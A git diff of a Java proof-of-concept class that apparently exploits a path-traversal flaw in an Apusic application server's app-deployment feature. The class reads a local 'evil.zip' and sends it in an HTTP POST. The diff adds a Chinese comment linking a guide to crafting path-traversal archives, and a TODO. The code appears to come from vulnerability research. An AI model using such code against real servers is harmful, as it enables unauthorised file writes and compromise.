@@ -1,6 +1,5 @@
 package apusic;
 
-import com.apusic.deploy.runtime.SecurityConstraint;
 import org.apache.http.HttpEntity;
 import org.apache.http.HttpHost;
 import org.apache.http.HttpResponse;
@@ -21,7 +20,6 @@ public class deployApp_pathtraversal {
 
     public static void main(String[] args) throws IOException {
 
-
         FileInputStream fis = new FileInputStream("D:\\javaProjects\\VulDebug\\Kingdee\\src\\main\\resources\\evil.zip");
         byte[] bytes = new byte[fis.available()];
         fis.read(bytes);
@@ -37,7 +35,10 @@ public class deployApp_pathtraversal {
         httpClientBuilder.setDefaultRequestConfig(config);
         HttpClient httpClient = httpClientBuilder.build();
         HttpPost httpPost = new HttpPost(url);
-
+        /**
+         * 路径穿越文件制作参考：https://blog.csdn.net/weixin_45527658/article/details/121282357
+         */
+        // TODO 修改文件路径
         File file = new File("D:\\javaProjects\\VulDebug\\Kingdee\\src\\main\\resources\\evil.zip");
         String fileName = file.getName();
 
